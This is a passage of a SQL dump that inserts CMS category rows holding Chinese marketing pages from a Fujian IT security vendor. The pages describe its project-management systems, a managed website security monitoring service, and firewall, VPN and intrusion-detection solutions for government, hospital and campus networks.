INSERT INTO `xyh_category` VALUES ('35','大数据协同应用管理解决方案','BigData','/public/home/default/img/introduce/bigdata.png','8','35','0','','','提供面向省、市两级科学技术奖励的申报、评审、管理全过程的信息化、系统化、规范化、智能化的解决方案,提高奖励管理部门工作效率、降低办公成本,进一步提升科技奖励评审的科学性、公平性、公正性、公开性和准确性。主要功能有：专家管理、单位管理、申报管理、形审管理、网评管理、复评管理、终评管理、辅助决策分析管理、协调管理、通知公告管理、系统管理等。','','List_service.html','Show_article.html','<table style=\"font-size: 15px; color: rgb(138, 138, 139);\"><tbody><tr class=\"firstRow\"><td style=\"width:20%\">开发项目</td><td>项目说明</td></tr><tr><td>福建省科技厅科技计划项目管理信息系统权力运行网上公开项目</td><td>根据“业务公开、过程受控、全程在案、永久追溯”总体要求，针对科技厅科技计划项目管理系统存在的问题，着力对现有项目管理系统相应功能模块进行了补缺补漏和升级改造。项目建设达到了三个预期目标：一是规范管理流程、规范业务操作、规范评审标准、规范权力运行；二是确保项目管理全过程的公开、公平、公正，主动接受社会监督；三是提高管理效能，实现业务管理的科学化、智能化，提高服务水平，更好地方便科技用户，做到系统“好用、管用、必须用”。四是实现省级项目省、市、县（区）管理的三级联动。 目前，项目已投入运行，运行情况良好并得到了省监察厅领导的充分肯定，分别在科技厅召开了两场现场推进会。</td></tr><tr><td>福建省科技厅纪检监察管理信息系统</td><td>主要实现对科技厅科技计划项目管理工作进行有效监管，对科技计划项目管理等科技行政管理主要权力，实行预警提示、实时监控，超前防范、动态监管，有力推动了科技行政管理部门勤政廉政建设。系统于2010年建成并投入使用，多次获得纪检部门领导的充份肯定，是我省厅级部门中最早建成并投入使用的对业务系统行政权力实施监管、监控的监察管理信息系统。</td></tr><tr><td>福建省科技厅科技计划项目管理信息系统</td><td>福建省科技厅科技计划项目管理信息系统于2005年建成并投入使用，实现省级科技计划项目的指南发布、申报、推荐、查重、形审、专家网络评审、管理评审、综合评审、立项、任务书、执行情况、经费、验收管理等全过程的网络化、信息化管理。目前，已在系统上申报的项目50880个，注册的申报单位8615家，专家库共有省内外专家（含评审专家）112607名。目前，科技计划项目管理信息系统已完成产品化，其产品已在福州市科学技术局、莆田市科学技、漳州市科学技术局、龙岩市科学技术局、福建省交通厅、福建农林大学推广使用。使科技项目管理走向规范化、流程化、网络化、信息化，极大的提高科技项目管理效率，得到用户的一致好评。</td></tr><tr><td>福建省科学技术奖励管理信息系统</td><td>福建省科学技术奖励管理信息系统于2007年建成并投入使用，实现省级科学技术奖励的申报、推荐、查重、形审、专家网络评审、专业组复评、奖励委员会终评等全过程的网络化、信息化管理。目前，科学技术奖励管理信息系统的经验得到推广和借鉴，并在此基础上研发了福建省杰出人才管理信息系统、科技创新与科技创业人才管理信息系统，为福建省人才管理提供了便捷、高效的管理模式。</td></tr><tr><td>莆田市科技计划项目管理权力运行网上公开系统</td><td>主要实现莆田市本级科技计划项目的指南发布、申报、推荐、查重、形审、专家网络评审、管理评审、综合评审、立项、任务书、执行情况、经费、验收管理等全过程的网络化、信息化管理。实现市本级项目县（区）市管理的二级联动。实现对科技管理行政权力的预警提示、实时监控，超前防范、动态监管，有力推动了科技行政管理部门勤政廉政建设。</td></tr><tr><td>福建农林大学科技管理信息系统</td><td>主要实现福建农林大学科技项目（校内、校外项目）的指南发布、申报、推荐、查重、形审、专家网络评审、管理评审、综合评审、推荐评审、立项、任务书、执行情况、经费、验收管理等全过程的网络化、信息化管理。实现科技项目经费与校财务系统的对接，有效的提高财务人员对项目经费的管理效率。</td></tr><tr><td>福州市公安局计算机防盗登记系统</td><td>主要实现机主及计算机集中注册管理、联网监测、信息查询、二手商家、报警服务等业务，实现计算机防盗登记系统数据统一集中存储、管理和数据挖掘分析。主要功能模块有：计算机标识信息登记、二手市场管理、接警台，定位追踪、短信发送等，系统有效提高了计算机失窃案的破案率。</td></tr></tbody></table>','1','5','/public/home/default/img/product/development.png');
INSERT INTO `xyh_category` VALUES ('84','网站安全服务','SecurityService','/public/home/default/img/server/01.png','5','35','0','','','海峡信息网站安全一体化服务，是一项托管式服务，客户无需安装任何硬件或软件，无需改变目前的网络部署状况，无需专门的人员进行安全设备维护及分析日志。只需要将监测的网站域名告知海峡信息安全团队，许可后即可获得7×24小时的网站安全监测服务，一旦客户的网站遇到风险状况后，海峡信息安全团队会在第一时间与客户确认，并提供专业的解决方案建议。同时，海峡信息安全专家会根据监控情况定期出具周期性的监测报告，让客户整体掌握网站的风险状况及安全趋势。除此之外，海峡信息安全团队将周期性对客户的网站进行现场评估，识别客户网站、应用','','List_service.html','Show_article.html','<p>网站出现木马、用户名密码被窃取、访问网页速度慢等问题极大地困扰着网站提供者，它给企业形象、信息网络甚至核心业务造成严重的破坏。虽然可以通过部署入侵保护系统、网站防火墙等相关防御类产品来起到一定的防御效果，但是显然这不是万全之策，用户难以更早的发现风险隐患，预防这些安全事件。另外安全管理员需要维护大量的安全设备，分析众多日志信息，带来额外的工作量。</p><p>若能够主动的发现网站的风险隐患，并及时采取修补措施，则可以降低风险、减少损失，海峡信息针对该需求，结合软件即服务（SaaS）的服务模式，推出网站安全漏洞检测，网站源代码加固，网站安全监测，网站网页防篡改一体化服务解决方案。通过全面深入的漏洞识别、7×24小时不间断的远程专家值守，为客户互联网网站提供远程安全监测、安全检查、实时响应和人工分析服务，是构建完善的网站安全体系的最好补充。</p><p>客户需求：（1）门户网站是我们公司的门面，但总是有些不法之徒来破坏。（2）和平时相比，节假日的情况更严峻，网站无人看守，我们又不能把服务停了。（3） 我们不是专业的安全人员，无法看到网站的潜在威胁，但总是能听说这方面的报道，让我们胆战心惊。</p><p>服务介绍：海峡信息网站安全一体化服务，是一项托管式服务，客户无需安装任何硬件或软件，无需改变目前的网络部署状况，无需专门的人员进行安全设备维护及分析日志。只需要将监测的网站域名告知海峡信息安全团队，许可后即可获得7×24小时的网站安全监测服务，一旦客户的网站遇到风险状况后，海峡信息安全团队会在第一时间与客户确认，并提供专业的解决方案建议。同时，海峡信息安全专家会根据监控情况定期出具周期性的监测报告，让客户整体掌握网站的风险状况及安全趋势。除此之外，海峡信息安全团队将周期性对客户的网站进行现场评估，识别客户网站、应用系统、服务器等当前的安全漏洞和已知的安全弱点，并提供专业的安全加固措施。<br/><br/>具体的内容如下图所示：</p><p><img src=\"http://www.fjssc.cn/uploads/allimg/130926/1-130926111123601.png\"/></p><p>包括：</p><p>（1）网站漏洞检测</p><p>海峡信息网站安全以在线检测为主，人工渗透测试为辅的服务方式，基于互联网远程检测，测试和识别客户网站当前的安全漏洞和存在的安全弱点，并对WEB应用系统进行全面、深入和扩大化的安全漏洞识别、挖掘和利用。</p><p>（2）网站安全加固</p><p>针对网站漏洞深度检测的结果，海峡信息安全服务团队从web服务器安全、web源代码安全、web应用系统安全，这三个方面出发，为客户提供专业的安全加固措施及有效的安全加固办法，从实质上提高WEB安全。</p><p>（3）网站安全监控</p><p>海峡信息安全服务团队为客户提供多种监控服务，满足客户多种需求，包括但不限于：一次性复查服务、重大节日检测服务、7×24h安全监控服务、5×8h安全监控服务等。为客户网站提供网站的可用性监控、网站的页面篡改监控、网站挂马监控等并同时提供网站应急响应服务。这些信息将通过邮件、短信等方式直接提醒安全服务部的工程师，确保网站的可用性、安全性实时掌控。</p><p>（4）网站定期巡检</p><p>对客户门户网站进行安全巡检，及时修补网站中被发现的安全 漏洞和隐患并针对所发现的漏洞和隐患进行安全加固和优化；当网站本身或网站服务器出现异常或者病毒、黑客入侵时，提供应急预案进行处理，确保在最短时间内 处理事件、及时补救、消除隐患。并根据当前的安全形势动态调整安全策略，以提高信息系统的安全性。</p><p>（5）定期汇总报告</p><p>海峡网站安全服务将定期为用户汇总监测数据，统计并分析出近期网站存在的漏洞处理情况、网页木马及篡改发生的频率及处理情况、网站可用性以及可用性情况供用户 参考。通过汇总报告可以更为全面的了解网站的服务质量、安全防护水平。周期性全自动化监测，可负责对网站的内容安全（如 ICP 备案情况、敏感关键字、挂马）和脆弱性（如SQL注入、跨站脚本、WEB后门）问题进行监测，并提供详细的监测报告展示，让您对所监测网站的安全状况一目了然。</p><p>客户价值：（1）7×24小时在线监控，不遗漏一个风险；（2）专家人工验证，不再为误报心惊肉跳；（3）第一时间掌握网站安全状况和潜在风险；（4）实时告警、定期报告，让您安枕无忧；（5）托管式安全服务，节约您的投资和管理成本。</p><p>典型案例</p><p>福州市奥运安保信息网络安全大检查的280家企事业单位</p><p>福州市重点信息网络监管单位重要会议中的120家企事业单位</p><p>福州市公安局</p><p>兴业证券股份有限公司</p><p>福建省侨办</p><p>福建省自考办</p><p>福建省人事厅</p><p>福建省师大人武学院</p><p>湖南省商务厅</p><p>中国上海兴业期货网站</p><p>福建省南平市人民政府门户网站</p><p>福建省三明市人民政府门户网站</p><p>福建省龙岩市人民政府门户网站</p><p>福建省国土资源厅网站</p><p>福建省环保厅网站</p><p>福州市便民呼叫中心</p>','1','1','/public/home/default/img/server/01.png');
INSERT INTO `xyh_category` VALUES ('43','电子政务系统行业安全应用解决方案','Government','/public/home/default/img/introduce/Government.png','8','35','0','','','电子政务是国家信息化服务能力的体现，是政府进行管理、决策和服务的重要手段。电子政务信息系统通过政务信息网、政务外网、政务专网和互联网提供服务，必然会遭遇来自恐怖集团、敌对势力、捣乱分子的安全威和网络攻击。伴随近年愈演愈烈的网络安全态势，承载着众多电子政务信息系统和政务数据、作为电子政务信息原点和数据交换平台的电子政务数据中心，面临着严唆的安全挑战。如何规划和建设安全的政务数据中心，成为电子政务建设工作中的难点课题','','List_service.html','Show_article.html','<h1 style=\"font-size: 32px; font-weight: bold; border-bottom-width: 2px; padding: 0px 4px 0px 0px; text-align: center; margin: 0px 0px 20px;\"><span style=\"color: rgb(79, 129, 189); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\">海峡信息为政务信息网的安全运行保驾护航</span></h1><p><br/></p><p style=\"text-indent: 2em; line-height: 1.75em;\"><span style=\"font-family: 宋体, SimSun;\">随着“数字城市”和“数字福建”大型数字化网络工程的提出和实施，从目前已进行的 政务信息 系统应用和安全建设的现状看，普遍存在物理隔离两套网络应用系统，或者采用了公开的 Internet 与内部的 Intranet 相对隔离的的网络方案。由于从 政府 系统的应用方面分析， 政府 系统与其他信息系统的最大区别在于，所承载的信息流和数据更为重要，对安全性、可靠性的要求极高。 我们应该意识到事务的两面性，随着 政务 应用的不断增加，网络安全风险也会不断暴露出来。原来由单个计算机安全事故引起的损害可能传播到其他系统和主机，引起大范围 政务网络 的瘫痪和损失。而且由于政府系统属于国家机关应用系统，都有政府各自厅局的国家机密信息，如果这些机密信息在网上传输过程中泄密，其造成的损失将是不可估量的。 因此，网络安全建设成为 政府 建设的必然选择和基本保证。 所以政府行业网络安全方案的解决不容忽视。</span></p><ul class=\" list-paddingleft-2\" style=\"list-style-type: square;\"><li><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>政务网信息安全需求分析</strong></span></p></li></ul><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">通过以上对政府网络系统应用与安全风险分析，我们提出防范网络安全危险的安全需求：</span></p><ol class=\"custom_num list-paddingleft-1\"><li class=\"list-num-1-1 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">1)采用防火墙的控制技术来防范来自不安全网络或不信任域的非法访问或非授权访问。</span></p></li><li class=\"list-num-1-2 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">2)采用 VPN 的应用技术来加密、认证技术防范信息在网络传输过程中被非法窃取，而造成信息的泄露，并通过认证技术保证数据的完整性、真实性、可靠性。</span></p></li><li class=\"list-num-1-3 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">3)采用入侵检测技术来实时检查进出网络的数据流，动态防范各种来自内外网络的恶意攻击。</span></p></li><li class=\"list-num-1-4 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">4)采用网络安全评估系统定期或不定期对网络系统或操作系统进行安全性扫描，评估网络系统及操作系统的安全等级，并分析提出补救措施。</span></p></li><li class=\"list-num-1-5 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">5)采用防病毒产品及技术实时监测进入网络或主机的数据，防范病毒对网络或主机的侵害。</span></p></li><li class=\"list-num-1-6 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">6)制定完善安全管理制度，并通过培训等手段来增强员工的安全防范技术及防范意识。</span></p></li></ol><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>黑盾网络安全解决方案</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">举一个比较典型的政府网络应用系统。如下图示：整个网络纵向覆盖省市、区县；而横向也可以与许多单位连接。我们针对这样的网络来举例说明如何解决其网络安全问题。</span></p><p style=\"text-align: center; line-height: 1.5em;\"><img src=\"/ueditor/php/upload/image/20170615/1497506610262278.gif\"/></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>访问控制</strong></span></p><ol class=\"custom_num list-paddingleft-1\"><li class=\"list-num-1-1 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">1)政府有连接 Internet 公网的应用需求，出于安全，把政府系统中部分公开信息网及内部有涉密信息的办公网与有上 Internet 公网需求的子网完全物理隔离。使它们是两组完全互相独立的网络，防止因上公网而造成的安全问题危及到需保护的网络。</span></p></li><li class=\"list-num-1-2 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">2)对内部办公系统中不同部门或不同安全级别的用户组利用交换机划分虚拟子网技术划分不同子网，对局域网内部做到较简单的访问控制。</span></p></li><li class=\"list-num-1-3 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">3)在各级政府外部网主交换机与本系统纵向网互连的边界路器之间安装黑盾防火墙系统，黑盾防火墙可以做到隔离不同网络，并防范外部网络非法访问及恶意攻击。</span></p></li><li class=\"list-num-1-4 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">4)对远程拔号访问内部网用户可以充分利用黑盾防火墙系统的一次性口令认证机制来对访问用进行安全的身份检查，只有通过认证才可进行访问，而且由于采用一次性口令机制，所以，这样防护措施安全强度相当高。</span></p></li><li class=\"list-num-1-5 list-num-paddingleft-1\"><p style=\"line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">5)在各级政府内部网主交换机与其他政府各单位互连的边界路器之间安装黑盾防火墙系统，黑盾防火墙做到隔离不同网络，并防范外部网络非法访问及恶意攻击。</span></p></li></ol><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>信息传输</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">为了保护数据信息从发起端到接收端传输过程的安全性，在每一级网络配备的黑盾防火墙系统与边界路由器之间应有网络层加密功能，由于网络层加密可以实现网关到网关的加密与解密，因此，在每个有重要传输数据的网点只需配备一台网络层加密的黑盾防火墙。利用加密技术以及安全认证机制，保护信息在网络上传输的机密性、真实性、完整性及可靠性。</span></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>安全检测</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">防火墙的安全保护是属于静态安全防护，其功能及作用范围也是有限的，不可能做到全面的防护。黑盾网络入侵检测技术是防火墙的有利补充。因此，在各省市、区县行中存放有政务务数据库或者是存放有涉密信息的网络，配备一套入侵检测系统，通过实时监测进出网络的数据流，一旦发现不安全的访问行为，并依据策略采取相应的处理手段（阻断、报警等）。做到既防范外网的攻击，又能防范内部网发起的攻击。</span></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>安全评估</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">为了减少因系统存在的安全漏洞而造成的黑客的攻击，利用现有的网络安全分析系统，分析网络系统结构、配置等是否存在安全漏洞，并根据所得结果采取相应的解决办法。同时利用操作系统安全扫描系统，以管理员的身份对使用的各种操作系统进行安全性扫描，依据结果，增加安全补丁及填补安全漏洞。</span></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>病毒防护</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">政府系统中网络操作系统可能是各种网络操作系统，而办公网终端一般采用的 WINDOWS 操作系统。为了防止病毒的侵害，根据不同的操作系统类型，配备相应的防病毒系统，比如支持各种网络操作系统的防病毒软件、支持 UNIX 、 LINUX 、 WINDOWS 2000/NT 或 WINDOWS 95/98 的防病毒软件。通过这些软件所具有的实时检测功能，达到防范病毒侵害的目的。</span></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>安全管理</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">安全管理必须结合个单位自身的特点及需求来详细制定，本实例仅列出部分安全管理内容，仅供参考。访问控制使用权限的发放与回收、信息处理系统使用的媒介发放与回收、处理保密信息、硬件和软件的维护、系统软件的设计、实现和修改；重要程序和数据的删除和销毁等、职务的任期期限、职责分离　、建立安全管理机构、制定安全管理制度、安全事件处罚。</span></p><p style=\"line-height: 1.5em;\"><span style=\"color: rgb(79, 129, 189); font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong>多层防护，安全无忧</strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\">海峡信息公司针对政府系统的特殊性，量身定做黑盾防火墙系统的几大功能模块，如：各功能区灵活丰富的访问控制技术、 VPN 专网、 VPDN 的移动用户支持、远程管理主机控制、网络数据纪录分析、正反 NAT 技术、时间和流量的严格控制、 MAC 地址绑定、双机热备份、和 IDS 的联动技术等等；黑盾 NIDS 针对政府系统的几大功能模块，如：网络实时检测功能（网络流量、协议流量、用户流量、包长度分布）、内容过滤、 MAC-IP 绑定、 页面重组、多个网段监视、丰富的入侵规则库、智能化的日志统计分析、分层多级管理技术、在线升级规则库等，全面打造政务信息网信息安全的钢铁长城。</span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><br/></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"></span></p><p style=\"white-space: normal; line-height: 1.5em;\"><span style=\"font-size: 20px; color: rgb(192, 80, 77); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong><span style=\"font-size: 20px; color: rgb(192, 80, 77);\">成功应用案例:</span></strong></span></p><p style=\"white-space: normal; line-height: 1.5em;\"><span style=\"color: rgb(192, 80, 77); font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;\"><strong><span style=\"color: rgb(192, 80, 77); font-family: 宋体, SimSun; font-size: 18px;\">福建省科技厅、福建省人民检察院、福建省水利厅、福建省人大、福建省监察厅、福建省委办公厅、福州海关</span></strong></span></p><p style=\"text-indent: 2em; line-height: 1.5em;\"><span style=\"font-family: 宋体, SimSun;\"><br/></span><br/></p><p style=\"line-height: 1.5em;\"><br/></p>','1','2','/public/home/default/img/introduce/Government.png');
INSERT INTO `xyh_category` VALUES ('44','医疗卫生系统安全等级保护建设解决方案','Medical','/public/home/default/img/introduce/Medical.png','8','35','0','','','“适度安全、分级保护”是等级保护安全建设的基本方法，等级保护可以把业务系统、信息资产、安全边界等进行“等级化”，分而治之，从而实现信息安全等级保护的“适度安全、分级保护”思想。海峡信息以国家相关法规标淮为依据，以海峡信恵等级保护知识库和支撑平台为基础，形成合理的安全评估、规划设计、解决方案和系列安全服务，构成等级保护安全建设体系。','','List_service.html','Show_article.html','<p>为医院卫生系统网络安全“把脉”</p><p>福建省 远程医疗系统是一种融合高速数据通信技术，多媒体技术和会议电视技术的新型专用应用系统，它的关键核心技术主要有 : 宽带通信网络技术，计算机多媒体技术，交互式图象通信技术，视像会议技术。远程医疗系统可以提供的功能和服务包括：远程专家会诊：异地医学专家通过远程医疗电视会议系统对同一病例进行会诊，包括高精度图象传送，交互式电子白板等功能；远程手术观摩：通过远程医疗电视会议系统，更多的医生可以在异地观摩手术，达到共同提高和学术交流的目的；远程医学学术交流以及医护人员的远程教学和培训：通过远程医疗系统，两地的医生可以进行医学的学术交流，医护人员可以在本地接收中心医院或医学院的指导和培训。</p><ol class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"><li><p>远程医疗网络安全解决方案结构示意图:</p></li><li><p><img src=\"http://www.si.net.cn/image/projict_ws.gif\"/><br/></p></li></ol><p>注释：</p><p>1 . 福建省远程医疗的建设是利用电信宽带网为通信平台，通过省远程医疗中心的信息交换站点，连接各级医院形成具有专业功能的虚拟专网系统（ VPN），因此在配置网络安全产品时考虑配置带VPN模块的防火墙。</p><p>2.建立各级医院远程医疗网络工作站，通过视频会议方式开展远程医疗服务，如在网上开展医疗技术咨询，医疗方案研讨等；或以一点对多点的通讯方式实现远程医学教育，包括医学课程讲座、手术教学观摩等，因此防火墙同时也支持视频服务。</p><p>3.构筑福建省远程医疗管理中心网络控制平台，实现远程医疗的统一管理和统一调度功能。提供良好的网络安全管理体系，整个网络系统要求有充分的安全措施，以保障网络服务的可用性和网络信息的完整性。考虑网络安全时不仅要考虑来自网络外部的安全威胁，也要考虑内部的安全威胁。</p><p>2.医保网络安全解决方案应用示意图:</p><p><img src=\"http://www.si.net.cn/image/projict_ws2.gif\"/></p><p>注释：</p><p>1.这是某医院大楼的局域网网络安全结构图。某医院的内部网络安全方案包括以下几个主要方面：a.某医院局域网中内部网络的全面安全，对数据库服务器的全面防护；b.某医院局域网与医保的接入安全。</p><p>2.某医院目前采用的安全措施是利用操作系统、数据库、应用系统本身的安全性，对用户进行权限控制；在安全产品方面还没有采用任何安全措施。就目前的网络状况来看， 某医院计算机网络系统，需要为外部网络提供信息，因此与外部网络连接是不可避免的，这种连接为信息交换带来了方便，但同时也为非法用户的入侵带来了可乘之机。</p><p>3.所以就目前的网络安全措施仍不完善的情况下，仍存在许多安全隐患：</p><p>1) 对内部网络缺乏相应的安全措施，无法监测内部用户的行为。一旦发生内部攻击或用户误操作，将对内部局域网造成较大危害，而网络管理人员根本无法监控，因此，我们建议在交换机上安装网络入侵检测系统，实现对内网和外网用户数据传输与访问服务的全面监控，达到记录、报警、阻断、事后审计等功能。由于某医院目前都是连接到中心交换机，所以建议在中心交换机上装上一台入侵检测系统，进行实时监控，具体方案可以参考拓扑图，推荐使用黑盾网络入侵检测系统。</p><p>2）在与医保的连接上，由于使用DDN接入，所以建议使用防火墙，进行内外网的安全防护，推荐使用黑盾防火墙。</p><p>3）网络中各操作系统存在的漏洞将可能导致整个网络的安全设备形同虚设，表现为：微软的操作系统存在大量的安全漏洞，相关的一些应用软件存在安全漏洞。非法攻击者可以通过漏洞直接攻击服务器，窃取资料、破坏数据，因此针对某医院的实际网络，建议在配置安全产品前使用网络安全扫描系统，对全网系统进行安全评估，并根据建议修补系统安全漏洞。</p><p>4)目前医疗系统仍有存在病毒的侵袭问题，所以建议配置网络版防病毒，进行网络统一管理，定期更新病毒库，达到全面防护的效果。</p><p>5）医疗系统的数据库系统的保护同样是刻不容缓的，所以备份系统和数据库也是首当其冲考虑的，因此要配置数据备份系统。</p><p>成功应用案例:</p><p>福建省卫生厅、福建省立医院、福建省协和医院、南京军区福州总医院、厦门市卫生局、福建省防疫站、厦门中山医院.</p>','1','3','/public/home/default/img/introduce/Medical.png');
INSERT INTO `xyh_category` VALUES ('45','教育行业信息化安全建设解决方案','Education','/public/home/default/img/introduce/Education.png','8','35','0','','','校园网的建立不仅是网络硬件和应用的建立，因此还应重视校园网的安全问题。事实上，校园网安全和企业网、政府网和公众网的安全一样重要。网络安全是一个体系结构，涉及整个办公环境的各个方面，包括人员和设备，包括信息的驻留点以及沿途经过的各个中间环节，从物理层到应用层都要小心对待。 Internet的普及以及今天校园教学、科研和办公等多方面的应用对Internet的依赖都促使校园网应该增强实施安全的措施。 校园网络的安全一般分为内部网络安全和外部网络安全。内部网络安全涉及校园网内部建网的网络设备，而外部网络安全主要针','','List_service.html','Show_article.html','<p>教育行业日益倚重黑盾网络安全解决方案</p><p>校园网的建立不仅是网络硬件和应用的建立，因此还应重视校园网的安全问题。事实上，校园网安全和企业网、政府网和公众网的安全一样重要。网络安全是一个体系结构，涉及整个办公环境的各个方面，包括人员和设备，包括信息的驻留点以及沿途经过的各个中间环节，从物理层到应用层都要小心对待。 Internet的普及以及今天校园教学、科研和办公等多方面的应用对Internet的依赖都促使校园网应该增强实施安全的措施。</p><p>校园网络的安全一般分为内部网络安全和外部网络安全。内部网络安全涉及校园网内部建网的网络设备，而外部网络安全主要针对防火墙。通过对已建校园网的大中专院校、中小学校的调查发现，校园网络的安全问题已经成为威胁到信息技术教育进一步推进的首要问题，和互联网所经受的考验一样，病毒、攻击和各种各样的不健康信息以其越来越大的危害侵蚀着学校这片净土。简而言之，校园网的安全问题主要体现在以下几个方面：网络攻击、不健康信息、病毒、 IP盗用。</p><p>鉴于教育行业各院校网络结构的复杂性和多样性，我们以成功实施的福建某学院为例，阐述“黑盾”系列安全产品为教育行业建立的解决方案。</p><p><img src=\"http://www.si.net.cn/image/projict_jy.gif\"/></p><p>虚拟网络技术（ＶＰＮ）</p><p>该学院总共有 几个校区，各校区申请了各自的 Internet 线路，并且需要利用 Internet 线路实现各校区间的互连。</p><p>因此，在每个校区的网络边界分别配置一套黑盾防火墙， 对内外网进行隔离，保护内部网络不受外部非授权或不正当的访问 ，保证进出的数据包得到很好的过滤和正常传输。其次，借助黑盾防火墙的 VPN 模块，实现在几个校区间的安全连接。</p><p>基于 IPSec 标准的 VPN 技术能够很好地实现对远程数据传输进行加密，在 Internet 上建立加密隧道，数据 信息以加密的形式在 Internet上传输，这样即使第三方截获或窃听到加密的数据，也只是一堆毫无意义的字符，无法了解信息的真实意义。利用黑盾防火墙的VPN功能，学院几个校区之间交换的数据是在VPN加密隧道中进行传输，使得校区之间的业务数据传递 能够在公用网络平台得到与专网相同的安全性，而无需额外的资金的投入。 对于移动用户，通过拨号连入 Internet的，黑盾防火墙支持其以拨号VPN（VPDN）的形式接入内网，访问授权的数据，实现安全的移动办公。</p><p>同时，在各个校区的内部局域网中分别 安装“黑盾”网络入侵检测系统， 监控内部网的数据流量和网络运行情况，保护关键主机及服务器，防止内、外部用户对重要服务器的非授权或者非法访问，保证网络正常运行。例如：可以利用“黑盾”网络入侵检测系统的 IP-MAC 绑定功能，避免 IP 盗用；可以利用“黑盾”网络入侵检测系统的内容过滤、 URL 过滤功能，实现对有害信息的过滤；由“黑盾”网络入侵检测系统对网络访问进行监控，阻断、记录网络攻击行为等等。</p><p>入侵检测系统是一种主动的网络安全防护措施，它从系统内部和各种网络资源中主动采集信息，从中分析可能的网络入侵或攻击。更为重要的一点是，它易管理、配置简单，从而使非专业人员非常容易地获得网络安全。而且，入侵检测的规模还应根据网络威胁、系统构造和安全需求的改变而改变。入侵检测系统在发现入侵后，会及时作出响应，包括切断网络连接、记录事件和报警等。</p><p>该学院网络系统在安装了“黑盾”网络入侵监测系统后，有效的解决了来自网络安全各个层面上的非法访问和恶意攻击问题，既可以避免来自外部网络的恶意攻击，同时也可以加强内部的安全管理，保证主机资源不受来自内部网络的安全威胁，防范住了防火墙后面的安全漏洞。“黑盾”防火墙和“黑盾”网络入侵检测系统相配合，解决了安全隔离、访问控制及攻击防范等方面的安全问题，为该院校教学工作的正常开展提供了一个安全的网络环境。</p><p>教育行业网络安全建议</p><p>作为专业的网络安全设备供应商，海峡信息公司为了帮助用户解决网络安全带给他们的隐患，正努力提供并完善自己的安全解决方案，使用户能够放心使用海峡信息公司的网络产品和解决方案，不再被安全问题所困扰。至今，海峡信息的多种网络产品已经可以在物理层、数据链路层、网络层以及传输层提供全面的安全解决方案。</p><p>对于校园整体网络而言，可以采用多种安全服务来保证安全性。如果有条件，可以在外围的工作组交换机部署 802.1x网络认证技术，或通过黑盾防火墙的IP/MAC绑定功能记住该设备的物理地址，其他PC机无法通过该端口上网。对于内部的服务器，以及所有的关键业务客户端比如财务部PC机，建议安装黑盾灵巧免维护防火墙和黑盾网络入侵监测系统，为这些安全性要求高的资源提供保障。</p><p>对于内网与外网的连接，建议采用高性能的黑盾 